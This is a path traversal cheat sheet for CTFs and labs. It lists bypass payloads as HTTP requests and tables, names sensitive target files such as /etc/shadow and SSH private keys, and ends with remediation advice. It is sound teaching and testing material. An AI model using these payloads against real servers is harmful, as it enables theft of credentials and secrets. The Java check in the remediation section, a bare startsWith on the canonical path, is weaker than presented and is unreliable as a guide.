# Path Traversal (Directory Traversal) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Intruder  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

Path Traversal allows an attacker to read arbitrary files on the server running the application by manipulating file references.

1. **Locate File-Handling Parameters:**
   - Image and media loaders: `?filename=image.jpg`, `?file=avatar.png`
   - Document downloads: `?download=report.pdf`, `?path=data/2026/`
   - Template/page loaders: `?page=about.html`, `?view=index`
2. **Determine Operating System:**
   - **Linux Target:** Probe `/etc/passwd`, `/etc/issue`, `/proc/version`.
   - **Windows Target:** Probe `C:\windows\win.ini`, `C:\boot.ini`, `C:\windows\system32\drivers\etc\hosts`.
3. **Test Traversal Sequence Variations:**
   - Direct relative traversal: `../../../etc/passwd`
   - Absolute path bypass: `/etc/passwd`
   - Nested / non-recursive bypass: `....//....//etc/passwd`
   - URL-encoding and double encoding: `%2e%2e%2f`, `%252e%252e%252f`
   - Base folder preservation: `/var/www/images/../../../etc/passwd`
   - Null-byte extension bypass: `../../../etc/passwd%00.png`

---

## 2. Exploitation Techniques & Bypasses

### 1. Simple Relative Path Traversal
The application takes the input and appends it to a base directory:
```http
GET /image?filename=../../../etc/passwd HTTP/2
```
*Windows probe:* `filename=..\..\..\windows\win.ini`

---

### 2. Absolute Path Bypass
The application strips traversal sequences (`../`), but accepts an absolute path directly:
```http
GET /image?filename=/etc/passwd HTTP/2
```
*Windows probe:* `filename=C:\windows\win.ini`

---

### 3. Non-Recursive Stripping Bypass (`....//`)
The application strips `../` or `..\` once without looping:
When `../` is removed from `....//`, the surrounding characters collapse into a new `../`:
```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
```
*Windows probe:* `....\\....\\....\\windows\\win.ini`

---

### 4. URL Encoding & Double Encoding Bypasses
The application validates the path before decoding the URL:

| Sequence | Encoding | Payload |
|---|---|---|
| Single URL encode | `%2e%2e%2f` | `..%2f..%2f..%2fetc/passwd` |
| Full Single encode | `%2e%2e%2f` | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` |
| Double URL encode | `%252e%252e%252f` | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` |
| Overlong UTF-8 | `%c0%af` or `%e0%80%af` | `..%c0%af..%c0%af..%c0%afetc/passwd` |

---

### 5. Validation of Base Path Prefix
The application requires the input to start with an expected folder (e.g. `/var/www/images/`):
Prepend the required folder path and then traverse upward:
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
```

---

### 6. Validation of File Extension with Null Byte (`%00`)
The application verifies that the filename ends with an approved image extension (`.png`, `.jpg`).
In legacy runtimes (e.g., PHP < 5.3.4), a null byte truncates the string at the filesystem API level:
```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
```

---

## 3. High-Value Target Files

### Linux Targets
```text
/etc/passwd                 # User accounts
/etc/shadow                 # Password hashes (requires root)
/etc/hosts                  # Internal host mappings
/proc/self/environ          # Environment variables & secrets
/proc/self/cmdline          # Current process command-line
/var/log/apache2/access.log # Web server logs (log poisoning target)
/var/log/nginx/access.log   # Nginx access logs
~/.bash_history             # User command history
~/.ssh/id_rsa               # Private SSH keys
```

### Windows Targets
```text
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\Users\Administrator\Desktop\flag.txt
C:\inetpub\wwwroot\web.config
```

---

## 4. CTF Quick Reference

| Defense Encountered | Bypass Strategy | Example Payload |
|---|---|---|
| **Blocks `../`** | Absolute path | `/etc/passwd` |
| **Strips `../` once** | Nested sequence | `....//....//etc/passwd` |
| **URL Decoding Filter** | Double URL-encode | `%252e%252e%252fetc/passwd` |
| **Folder Prefix Check** | Keep prefix, traverse up | `/var/www/images/../../../etc/passwd` |
| **Extension Check** | Null byte injection | `../../../etc/passwd%00.jpg` |
| **Windows Target** | Backslash traversal | `..\..\..\windows\win.ini` |

---

## 5. Remediation

- **Avoid Passing Filesystem Paths Directly:** Use an indirect reference map (e.g., numeric ID `?file_id=42` resolved server-side).
- **Canonicalize & Validate Paths:**
  ```java
  File file = new File(BASE_DIRECTORY, userInput);
  if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
      throw new SecurityException("Directory traversal attempt detected");
  }
  ```
- **Use Built-in Filename Extraction:** Pass inputs through `basename()` to strip all directory path separators.
